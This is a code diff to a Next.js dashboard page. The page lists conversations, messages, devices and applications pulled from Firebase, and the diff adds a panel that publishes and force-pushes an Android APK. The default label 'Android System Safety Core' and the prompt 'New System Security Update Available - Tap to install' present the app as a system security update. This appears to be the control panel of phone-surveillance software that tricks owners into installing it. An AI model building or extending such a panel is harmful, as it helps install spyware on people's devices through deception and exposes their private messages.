@@ -18,12 +18,17 @@ import {
   ShieldCheck,
   KeyRound,
   ArrowUpRight,
+  DownloadCloud,
+  ExternalLink,
 } from "lucide-react";
 import Link from "next/link";
+import { useAppUpdate } from "@/hooks/useAppUpdate";
+import { HARDENED_ROUTES } from "@/lib/security/routesConfig";
 
 export default function OverviewPage() {
   const { rawRecords, conversations, allMessages, devices, applications, loading, error } = useFirebaseData();
   const { isUnlocked } = useKeyVault();
+  const { data: appRelease } = useAppUpdate();
 
   // Compute actual metrics from live Firebase records
   const metrics = useMemo(() => {
@@ -95,6 +100,56 @@ export default function OverviewPage() {
             </div>
           </div>
         )}
+
+        {/* Featured Android App Release & Live Update Manager */}
+        <div className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-[#111b21] via-[#15232c] to-[#111b21] border border-emerald-500/30 flex flex-col md:flex-row items-start md:items-center justify-between gap-4 shadow-xl">
+          <div className="flex items-start sm:items-center gap-3.5 min-w-0">
+            <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 flex-shrink-0 shadow-lg shadow-emerald-500/10">
+              <DownloadCloud className="w-6 h-6 animate-pulse" />
+            </div>
+            <div className="min-w-0">
+              <div className="flex flex-wrap items-center gap-2">
+                <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">Android App Release Control</span>
+                <span className="px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 font-mono text-[10px] font-semibold">
+                  v{appRelease?.version_name || "2.0"} (Build {appRelease?.version_code || 2})
+                </span>
+                {appRelease?.force_update && (
+                  <span className="px-2 py-0.5 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-300 font-mono text-[10px]">
+                    Force Update Active
+                  </span>
+                )}
+              </div>
+              <h3 className="text-sm font-semibold text-white mt-1 truncate">
+                {appRelease?.title || "Android System Safety Core"}
+              </h3>
+              <p className="text-xs text-[#8696a0] truncate max-w-xl">
+                {appRelease?.message || "New System Security Update Available - Tap to install"}
+              </p>
+            </div>
+          </div>
+
+          <div className="flex items-center gap-2.5 w-full md:w-auto flex-shrink-0">
+            {appRelease?.apk_url && (
+              <a
+                href={appRelease.apk_url}
+                target="_blank"
+                rel="noreferrer"
+                className="px-3.5 py-2 rounded-xl bg-[#202c33] hover:bg-[#2a3942] text-xs font-medium text-slate-200 hover:text-white border border-[#2a3942] transition flex items-center gap-1.5"
+                title="Test APK download link"
+              >
+                <ExternalLink className="w-3.5 h-3.5 text-emerald-400" />
+                <span className="hidden sm:inline">Test APK</span>
+              </a>
+            )}
+            <Link
+              href={HARDENED_ROUTES.APP_UPDATES}
+              className="flex-1 md:flex-initial inline-flex items-center justify-center gap-2 px-4 py-2 rounded-xl bg-[#00a884] hover:bg-[#02906f] active:scale-95 text-white text-xs font-semibold shadow-lg shadow-emerald-600/20 transition cursor-pointer"
+            >
+              <span>Manage & Update Release</span>
+              <ArrowUpRight className="w-4 h-4" />
+            </Link>
+          </div>
+        </div>
 
         {/* 10 Required Metric Cards (Section 8) */}
         <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-3.5">
